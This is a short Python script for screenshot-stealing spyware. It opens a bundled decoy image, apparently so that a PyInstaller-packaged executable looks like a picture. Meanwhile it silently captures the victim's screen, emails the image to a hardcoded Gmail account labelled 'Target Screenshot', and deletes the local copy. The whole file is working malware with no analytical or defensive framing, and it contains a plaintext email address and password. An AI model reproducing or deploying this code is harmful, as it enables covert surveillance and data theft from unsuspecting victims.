import pyautogui
import smtplib
import tempfile
import os
import sys
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders



def send_mail(message):
    email = "rocketvk.18@gmail.com"
    password = "$aint_101"
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def attach(path):
    msg = MIMEMultipart()
    msg['Subject'] = "Target Screenshot"
    body = "your target's screenshot"
    msg.attach(MIMEText(body, 'plain'))
    filename = "scary.png"
    attachment = open(path+"\\"+filename, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    text = msg.as_string()
    #print(text)
    send_mail(text)


def recapture():
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)
    image = pyautogui.screenshot()
    image.save("scary.png")
    attach(temp_directory)
    os.remove("scary.png")



namas_bekin = sys._MEIPASS + "\sester.png"
try:
    subprocess.Popen(namas_bekin, shell=True)
except:
    num = 1
    am = 2
recapture()